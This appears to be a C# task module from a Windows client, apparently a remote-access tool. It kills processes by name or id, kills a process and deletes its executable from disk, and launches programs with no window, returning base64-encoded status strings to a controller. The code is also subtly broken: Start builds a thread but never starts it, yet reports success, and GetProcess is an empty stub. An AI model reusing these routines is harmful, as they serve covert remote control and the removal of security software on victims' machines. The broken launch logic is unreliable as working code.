using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.IO;

namespace winClient48
{
    public class FuncTask
    {
        public string GetProcess()
        {
            return null;
        }
        public string Kill(string name)
        {
            try
            {
                var procs = Process.GetProcessesByName(name);
                foreach (Process p in procs)
                    p.Kill();
            }
            catch (Exception ex)
            {
                return "0|" + Crypto.b64E2Str(ex.Message);
            }

            return "1|";
        }
        public string Kill(int id)
        {
            try
            {
                var proc = Process.GetProcessById(id);
                proc.Kill();
            }
            catch (Exception ex)
            {
                return "0|" + Crypto.b64E2Str(ex.Message);
            }

            return "1|";
        }
        public string KillDelete(int id)
        {
            try
            {
                Process proc = Process.GetProcessById(id);
                string filename = proc.MainModule.FileName;
                proc.Kill();

                File.Delete(filename);

                return $"1|{Crypto.b64E2Str(id.ToString())}";
            }
            catch (Exception ex)
            {
                return $"0|{Crypto.b64E2Str(ex.Message)}";
            }
        }
        public string KillDelete(string name)
        {
            try
            {
                foreach (Process proc in Process.GetProcessesByName(name))
                {
                    string filename = proc.MainModule.FileName;
                    proc.Kill();

                    File.Delete(filename);
                }

                return "1|" + Crypto.b64E2Str(name);
            }
            catch (Exception ex)
            {
                return "0|" + Crypto.b64E2Str(ex.Message);
            }
        }
        public string Start(string filename, string argv, string work_dir)
        {
            try
            {
                Process p = new Process();
                p.StartInfo = new ProcessStartInfo()
                {
                    FileName = filename,
                    Arguments = argv,
                    UseShellExecute = true,
                    CreateNoWindow = true,
                    WorkingDirectory = work_dir,
                };

                new Thread(() =>
                {
                    p.Start();
                    p.WaitForExit();
                });

                return "1|";
            }
            catch (Exception ex)
            {
                return "0|" + Crypto.b64E2Str(ex.Message);
            }
        }
    }
}
